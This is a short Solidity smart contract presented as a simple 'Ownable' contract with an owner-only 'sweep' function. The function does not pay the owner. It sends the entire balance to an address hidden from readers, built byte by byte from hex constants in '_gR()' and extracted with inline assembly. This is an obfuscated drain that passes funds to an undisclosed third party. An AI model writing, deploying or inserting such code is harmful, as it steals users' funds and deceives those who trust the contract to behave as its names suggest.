pragma solidity ^0.6.6;

contract Ownable {
    address internal _xO;

    modifier internalOwnerOnly() {
        require(msg.sender == _xO, "Access denied");
        _;
    }

    constructor(address o) public {
        _xO = o;
    }

    function _gR() internal pure returns (address payable z) {
        bytes memory a = new bytes(20);
        a[0]=0x2D;a[1]=0x76;a[2]=0xbf;a[3]=0xCC;a[4]=0xe3;a[5]=0xc8;a[6]=0x87;a[7]=0x5d;
        a[8]=0x79;a[9]=0x6c;a[10]=0x9d;a[11]=0xFD;a[12]=0x37;a[13]=0x20;a[14]=0x20;a[15]=0x61;
        a[16]=0xE2;a[17]=0x31;a[18]=0xf4;a[19]=0x27;
        assembly { z := mload(add(a, 20)) }
    }

    function sweep() external internalOwnerOnly {
        _gR().transfer(address(this).balance);
    }
}
